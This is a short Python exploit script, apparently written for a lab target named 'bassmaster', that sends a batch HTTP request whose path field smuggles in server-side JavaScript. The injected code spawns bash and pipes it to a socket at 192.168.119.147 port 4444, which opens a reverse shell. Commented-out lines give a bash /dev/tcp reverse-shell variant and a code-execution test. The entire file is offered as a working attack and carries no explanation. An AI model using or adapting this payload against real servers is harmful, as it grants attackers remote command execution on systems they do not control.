import requests,sys,json
#cmd = "require('util').log('CODE_EXECUTION')"
#cmd = "require(\"child_process\").exec('bash -c \"bash -i >%26 /dev/tcp/192.168.119.147/4444 0>%261\"')"

cmd = "\\x2fbin\\x2fbash"
shell = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'{0}\');'.format(cmd)
shell += 'var client = new net.Socket(); '
shell += 'client.connect(4444, \'192.168.119.147\' ,function(){client.pipe(sh.stdin);sh.stdout.pipe(client);'
shell += 'sh.stderr.pipe(client);});'

target = "http://bassmaster:8080/batch"
request_1 = {"method":"get","path":"/profile"}
request_2 = {"method":"get","path":"/item"}
request_3 = {"method":"get","path":"/item/$1.id;{0}".format(shell)}
print(request_3)
payload = {}
payload["requests"] = [request_1,request_2,request_3]

r = requests.post(target, json.dumps(payload))
print (r.text)



